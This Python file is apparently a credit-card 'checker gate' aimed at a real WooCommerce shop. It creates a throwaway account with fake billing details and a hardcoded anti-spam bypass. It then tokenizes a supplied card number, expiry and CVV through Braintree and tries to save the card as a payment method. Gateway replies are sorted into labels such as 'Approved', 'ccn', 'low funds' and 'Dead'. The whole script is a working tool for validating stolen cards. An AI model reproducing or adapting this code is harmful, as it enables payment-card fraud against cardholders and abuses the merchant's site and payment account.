import urllib.parse, base64
from utilsdf.functions import capture, random_email
from httpx import AsyncClient


async def gate_sexo(cc, month, year, cvv):
    async with AsyncClient(
        follow_redirects=True,
        verify=False,
    ) as session:
        mail = urllib.parse.quote(random_email())

        url = "musicaldrumming.com"

        head = {
            "Host": f"{url}",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
        }

        r = await session.get(
            f"https://{url}/my-account/",
            headers=head,
        )
        rnonce = capture(r.text, '"woocommerce-register-nonce" value="', '"')

        c = "apbct_visible_fields=eyIwIjp7InZpc2libGVfZmllbGRzIjoiZW1haWwiLCJ2aXNpYmxlX2ZpZWxkc19jb3VudCI6MSwiaW52aXNpYmxlX2ZpZWxkcyI6Indvb2NvbW1lcmNlLXJlZ2lzdGVyLW5vbmNlIF93cF9odHRwX3JlZmVyZXIgY3Rfbm9fY29va2llX2hpZGRlbl9maWVsZCIsImludmlzaWJsZV9maWVsZHNfY291bnQiOjN9fQ%3D%3D&ct_no_cookie_hidden_field=_ct_no_cookie_data_eyJhcGJjdF90aW1lc3RhbXAiOiIxNjk3ODM1MjQ3IiwiY3RfbW91c2VfbW92ZWQiOnRydWUsImFwYmN0X3VybHMiOiJ7XCJkaWdpY2VsLm5ldC9teS1hY2NvdW50L1wiOlsxNjk3ODM1MjQ3XX0iLCJjdF9oYXNfc2Nyb2xsZWQiOnRydWUsImN0X2NoZWNrZWRfZW1haWxzIjoiMCIsImN0X3BzX3RpbWVzdGFtcCI6IjE2OTc4MzUyNDciLCJjdF9jb29raWVzX3R5cGUiOiJub25lIiwiYXBiY3RfaGVhZGxlc3MiOiJmYWxzZSIsImN0X2hhc19rZXlfdXAiOiJ0cnVlIiwiYXBiY3RfcGFnZV9oaXRzIjoxLCJhcGJjdF92aXNpYmxlX2ZpZWxkcyI6IiU3QiUyMnZpc2libGVfZmllbGRzJTIyJTNBJTIyZW1haWwlMjIlMkMlMjJ2aXNpYmxlX2ZpZWxkc19jb3VudCUyMiUzQTElMkMlMjJpbnZpc2libGVfZmllbGRzJTIyJTNBJTIyd29vY29tbWVyY2UtcmVnaXN0ZXItbm9uY2UlMjBfd3BfaHR0cF9yZWZlcmVyJTIwYXBiY3RfdmlzaWJsZV9maWVsZHMlMjBjdF9ub19jb29raWVfaGlkZGVuX2ZpZWxkJTIyJTJDJTIyaW52aXNpYmxlX2ZpZWxkc19jb3VudCUyMiUzQTQlN0QiLCJhcGJjdF9zaXRlX2xhbmRpbmdfdHMiOiIxNjk3ODM1MjQ3IiwiYXBiY3RfY29va2llc190ZXN0IjoiJTdCJTIyY29va2llc19uYW1lcyUyMiUzQSU1QiUyMmFwYmN0X3RpbWVzdGFtcCUyMiUyQyUyMmFwYmN0X3NpdGVfbGFuZGluZ190cyUyMiU1RCUyQyUyMmNoZWNrX3ZhbHVlJTIyJTNBJTIyZTNiODE3N2ExY2E3NGNmYzYwOTAzZGUwYTk3MmJjZTklMjIlN0QiLCJjdF9oYXNfaW5wdXRfZm9jdXNlZCI6InRydWUiLCJjdF9ma3BfdGltZXN0YW1wIjoiMTY5NzgzNTI1OCIsImN0X3BvaW50ZXJfZGF0YSI6IiU1QiU1QjQwOCUyQzE2MCUyQzEyMzAzJTVEJTVEIiwiY3Rfc2NyZWVuX2luZm8iOiIlN0IlMjJmdWxsV2lkdGglMjIlM0EzNjAlMkMlMjJmdWxsSGVpZ2h0JTIyJTNBMjY0NCUyQyUyMnZpc2libGVXaWR0aCUyMiUzQTM2MCUyQyUyMnZpc2libGVIZWlnaHQlMjIlM0E2MjElN0QiLCJjdF9jaGVja2pzIjoiMTg5OTUxOTIwNCIsImN0X3RpbWV6b25lIjoiLTUiLCJhcGJjdF9waXhlbF91cmwiOiJodHRwcyUzQSUyRiUyRm1vZGVyYXRlMS12NC5jbGVhbnRhbGsub3JnJTJGcGl4ZWwlMkY1NjBiMzYyOTliYTNhYzI1OTNkZjZhYjA1OGZkOGMyYi5naWYiLCJhcGJjdF9zZXNzaW9uX2lkIjoiZ2JjcWl4IiwiYXBiY3Rfc2Vzc2lvbl9jdXJyZW50X3BhZ2UiOiJodHRwczovL2RpZ2ljZWwubmV0L215LWFjY291bnQvIiwidHlwbyI6W119"

        post2 = f"email={mail}&woocommerce-register-nonce={rnonce}&_wp_http_referer=%2Fmy-account%2F&register=Register&{c}"

        head2 = {
            "Host": f"{url}",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded",
            "origin": f"https://{url}",
            "referer": f"https://{url}/my-account/",
        }

        r2 = await session.post(
            f"https://{url}/my-account/",
            headers=head2,
            data=post2,
        )

        head3 = {
            "Host": f"{url}",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "referer": f"https://{url}/my-account/edit-address/",
        }

        r3 = await session.get(
            f"https://{url}/my-account/edit-address/billing/",
            headers=head3,
        )
        anonce = capture(r3.text, '"woocommerce-edit-address-nonce" value="', '"')

        post4 = f"billing_first_name=Sachio&billing_last_name=YT&billing_company=YT&billing_country=US&billing_address_1=118+W+132nd+St&billing_address_2=&billing_city=New+York&billing_state=NY&billing_postcode=10027&billing_phone=19006318646&billing_email={mail}&save_address=Save+address&woocommerce-edit-address-nonce={anonce}&_wp_http_referer=%2Fmy-account%2Fedit-address%2Fbilling%2F&action=edit_address&{c}"

        head4 = {
            "Host": f"{url}",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded",
            "origin": f"https://{url}",
            "referer": f"https://{url}/my-account/edit-address/billing/",
        }

        r4 = await session.post(
            f"https://{url}/my-account/edit-address/billing/",
            headers=head4,
            data=post4,
        )

        r5 = await session.get(
            f"https://{url}/my-account/payment-methods/",
            headers=head4,
        )
        cnonce = capture(r5.text, '"client_token_nonce":"', '"')

        head6 = {
            "Host": f"{url}",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded",
            "origin": f"https://{url}",
            "referer": f"https://{url}/my-account/payment-methods/",
        }

        r6 = await session.get(
            f"https://{url}/my-account/add-payment-method/",
            headers=head6,
        )
        wnonce = capture(r6.text, '"woocommerce-add-payment-method-nonce" value="', '"')

        post7 = f"action=wc_braintree_credit_card_get_client_token&nonce={cnonce}"

        r7 = await session.post(
            f"https://{url}/wp-admin/admin-ajax.php",
            headers=head6,
            data=post7,
        )
        ey = capture(r7.text, '"data":"', '"')
        be_1 = base64.b64decode(ey).decode("utf-8")
        be = capture(be_1, '"authorizationFingerprint":"', '"')

        head8 = {
            "Host": "payments.braintree-api.com",
            "content-type": "application/json",
            "authorization": f"Bearer {be}",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "braintree-version": "2018-05-10",
            "accept": "*/*",
            "origin": "https://assets.braintreegateway.com",
            "referer": "https://assets.braintreegateway.com/",
        }

        post8 = {
            "clientSdkMetadata": {
                "source": "client",
                "integration": "dropin2",
                "sessionId": "2eb8e620-9b4b-42d5-be2f-c3249ec470aa",
            },
            "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
            "variables": {
                "input": {
                    "creditCard": {
                        "number": f"{cc}",
                        "expirationMonth": f"{month}",
                        "expirationYear": f"{year}",
                        "cvv": f"{cvv}",
                        "cardholderName": "Sachio YT",
                        "billingAddress": {"postalCode": "10027"},
                    },
                    "options": {"validate": False},
                }
            },
            "operationName": "TokenizeCreditCard",
        }

        r8 = await session.post(
            "https://payments.braintree-api.com/graphql",
            headers=head8,
            json=post8,
        )
        tok = capture(r8.text, '"token":"', '"')
        brand_ = capture(r8.text, '"brandCode":"', '"').lower()

        head9 = {
            "Host": f"{url}",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded",
            "origin": f"https://{url}",
            "referer": f"https://{url}/my-account/add-payment-method/",
        }

        post9 = f"payment_method=braintree_credit_card&wc-braintree-credit-card-card-type={brand_}&wc-braintree-credit-card-3d-secure-enabled=&wc-braintree-credit-card-3d-secure-verified=&wc-braintree-credit-card-3d-secure-order-total=0.00&wc_braintree_credit_card_payment_nonce={tok}&wc_braintree_device_data=&wc-braintree-credit-card-tokenize-payment-method=true&woocommerce-add-payment-method-nonce={wnonce}&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&woocommerce_add_payment_method=1&{c}"

        r9 = await session.post(
            f"https://{url}/my-account/add-payment-method/",
            headers=head9,
            data=post9,
        )
        r99 = r9.text
        # with open("sexo.html", "w", encoding="utf-8") as f:
        #     f.write(r99)
        status_ = capture(r99, "There was an error saving your payment method. Reason: ", ":")
        msg1 = capture(r99, f"There was an error saving your payment method. Reason: {status_}: ", "		<")
        msg = f"There was an error saving your payment method. Reason: {status_}: {msg1}"

        if "Nice! New payment method added:" in r99:
            status = "Approved! ✅"
            msg = "Success -» $0"
        elif (
            msg == "Status code 2010: Card Issuer Declined CVV (C2 : CVV2 DECLINED)"
            or msg == "Status code cvv: Gateway Rejected: cvv"
            or msg == "Status code avs_and_cvv: Gateway Rejected: avs_and_cvv"
        ):
            status = "Approved! ✅ -» ccn"
        elif msg == "Status code 2001: Insufficient Funds (51 : DECLINED)":
            status = "Approved! ✅ -» low funds"
        elif msg == "Status code avs: Gateway Rejected: avs":
            status = "Approved! ✅ -» avs"
        else:
            status = "Dead! ❌"

        if status_ == None and msg1 == None and msg != "Success -» $0":
            status_, msg = "Error! ⚠️", "Error! ⚠️"

        return status, msg
